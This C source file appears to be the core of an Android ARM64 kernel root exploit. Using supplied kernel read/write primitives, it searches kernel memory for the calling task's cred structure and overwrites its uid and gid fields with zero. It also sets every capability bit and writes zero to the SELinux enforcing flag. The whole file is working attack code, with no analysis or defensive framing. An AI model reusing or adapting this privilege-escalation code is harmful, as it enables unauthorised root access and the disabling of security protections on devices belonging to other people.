#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include "becomeroot.h" 

#define MMAP_SIZE			0x40000
#define READ_SPLIT_ONE_SIZE		(MMAP_SIZE-0x1000)
#define MMAP_CRED_SIZE		200

#define KERNEL_START_INIT  	0xffffffc000480000UL
#define KERNEL_SEARCH_START 0xffffffc000000000UL
#define KERNEL_STOP_INIT   (KERNEL_SEARCH_START + 1024 * 1024 * 1024)

void* root_get_cred(int (*get_kernel_data)(void* kernel_start, void* local_addr, int size), struct process_identify* pi, int* offset_in_cred){
	char name[16] = {0};
	void* local0;
	void* local1;
	unsigned long kernel_search_start_addr;
	char* comm_ptr; 
	int is_found; 
	void* cred_addr;
	unsigned int* cred_uid_addr;
	int i;
	
	prctl(PR_GET_NAME, name);
	printf("[++] <root_get_cred> name=%s\n", name);
	
	local0 = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(MAP_FAILED == local0){
		printf("[--] <root_get_cred> failed to mmap\n");
		return NULL;
	}
	printf("[++] <root_get_cred> mmap addr 1 ******** %p~%p\n", local0, (void*)((unsigned long)local0+MMAP_SIZE));
	
	local1 = mmap(NULL, MMAP_CRED_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(MAP_FAILED == local1){
		printf("[--] <root_get_cred> failed to mmap\n");
		munmap(local0, MMAP_SIZE);
		return NULL;
	}
	printf("[++] <root_get_cred> mmap addr 2 ******** %p~%p\n", local1, (void*)((unsigned long)local1+MMAP_CRED_SIZE));
	
	for(kernel_search_start_addr=KERNEL_START_INIT; kernel_search_start_addr<KERNEL_STOP_INIT; ){
		if( MMAP_SIZE != get_kernel_data((void*)kernel_search_start_addr, local0, MMAP_SIZE) ){
			//printf("[--] <root_get_cred> failed to get_kernel_data\n");
			//return NULL;
			goto continue_for_label;
		}
		//printf("[++] <root_get_cred> kernel_search_start_addr=%p\n", (void*)kernel_search_start_addr);
		
		//定位comm
		is_found = 0;
		comm_ptr = (char*)local0;
		do{
			if( 0 == memcmp(comm_ptr, TASK_COMM_NAME_SELF, strlen(TASK_COMM_NAME_SELF)+1) ){
				is_found = 1;
				break;
			}
			comm_ptr+=sizeof(void*); 
		}while(comm_ptr < (char*)local0 + MMAP_SIZE - strlen(TASK_COMM_NAME_SELF)-1);
		
		if( 0 == is_found ){
			goto continue_for_label;
		}
		
		printf("[++] <root_get_cred> comm=%p 1\n", comm_ptr);
		
		comm_ptr = (char*)((unsigned long)comm_ptr & (~(sizeof(void*)-1)) ); 
		
		if( (unsigned long)comm_ptr-4*sizeof(void*) < (unsigned long)local0 ){//正好是comm在开始位置
			goto continue_for_label;
		}
		
		printf("[++] <root_get_cred> comm=%p 2\n", comm_ptr);
		
		//定位具体的cred
		is_found = 0;
		for(i=0;i<4;i++){
			cred_addr = *(void**)((unsigned long)comm_ptr-(i+1)*sizeof(void*));
			//printf("[++] <root_get_cred> cred_addr=%p\n", cred_addr);
			if( (unsigned long)cred_addr > KERNEL_START_INIT && 0xFFFFFFC000000000UL == ( (unsigned long)cred_addr & 0xFFFFFFC000000000UL ) ){
				if( MMAP_CRED_SIZE != get_kernel_data(cred_addr, local1, MMAP_CRED_SIZE) ){
					printf("[--] <root_get_cred> failed to get_kernel_data 2\n");
					continue;
				} 
				cred_uid_addr = (unsigned int*)local1;
				while( (unsigned long)cred_uid_addr < (unsigned long)local1+MMAP_CRED_SIZE){
					if( 0 == memcmp(cred_uid_addr, pi, sizeof(struct process_identify)) ){
						is_found = 1;
						break;
					}
					cred_uid_addr = cred_uid_addr + 1;
				}
				if( 1 == is_found ){
					break;
				} 
			}
		}
		if( 0 == is_found ){
			goto continue_for_label;
		}
		
		*offset_in_cred = (int)( (unsigned long)cred_uid_addr - (unsigned long)local1 );
		
		munmap(local0, MMAP_SIZE);
		munmap(local1, MMAP_CRED_SIZE);
		return cred_addr;
		
		break;
		
continue_for_label: 
		if( 0 == is_found ){
			kernel_search_start_addr+=READ_SPLIT_ONE_SIZE; 
		}else{
			kernel_search_start_addr-=0x1000; 
		}
	}
	
	munmap(local0, MMAP_SIZE);
	munmap(local1, MMAP_CRED_SIZE);
	return NULL;
}

int root_write_to_kernel(void* cred, int cred_offset, void* selinux, int (*write_kernel_data)(void* kernel_addr, void* local_addr, int size)){
	int se_value ;
	char cred_data[200];
	int size;
	void* kernel_data_addr;
	
	if(cred){
		//ruid/rgid/suid/sgid/euid/egid/fsuid/fsgid
		memset(cred_data, 0, sizeof(cred_data));
		size = 8 * sizeof(uid_t);
		kernel_data_addr = (void*)((unsigned long)cred + cred_offset);
		if( size != write_kernel_data(kernel_data_addr, cred_data, size) ){
			printf("[--] <root_write_to_kernel> failed to write_kernel_data 0\n");
			return -1;
		}
		
		//cap_inheritable/cap_permitted/cap_effective/cap_bset
		memset(cred_data, -1, sizeof(cred_data));
		size = 8 * 4;
		kernel_data_addr = (void*)((unsigned long)cred + cred_offset + 8 * sizeof(uid_t) + 4);
		if( size != write_kernel_data(kernel_data_addr, cred_data, size) ){
			printf("[--] <root_write_to_kernel> failed to write_kernel_data 1\n");
			return -1;
		}
	}
	
	if(selinux){
		se_value = 0;
		size = sizeof(int);
		if( size != write_kernel_data(selinux, &se_value, size) ){
			printf("[--] <root_write_to_kernel> failed to write_kernel_data 2\n");
			return -1;
		}
	}
	
	return 0;
}

int root_set_identify(struct process_identify* pi){
	if( -1 == getresuid(&pi->ruid, &pi->euid, &pi->suid) ){
		printf("[-] <root> failed to getresuid\n");
		return -1;
	}
	
	if( -1 == getresgid(&pi->rgid, &pi->egid, &pi->sgid) ){
		printf("[-] <root> failed to getresgid\n");
		return -1;
	}
	
	pi->fsuid = pi->ruid;
	pi->fsgid = pi->rgid;
	
	return 0;
}

void root_print_identify(struct process_identify* pi){
	printf("[++] <root_print> %d %d %d\n", pi->ruid, pi->euid, pi->suid);
	printf("[++] <root_print> %d %d %d\n", pi->rgid, pi->egid, pi->sgid);
	printf("[++] <root_print> %d %d\n", pi->fsuid, pi->fsgid);
}

int root_get_selinux_status(){
	int fd;
	char buf[8] = {0};
	int res = -1;
	
	fd = open("/sys/fs/selinux/enforce", O_RDONLY);
	if(-1 == fd){
		return res;
	}
	
	if( read(fd, &buf, sizeof(buf)) > 0 ){ 
		res = atoi(buf);
	}
	
	close(fd);
	return res;
}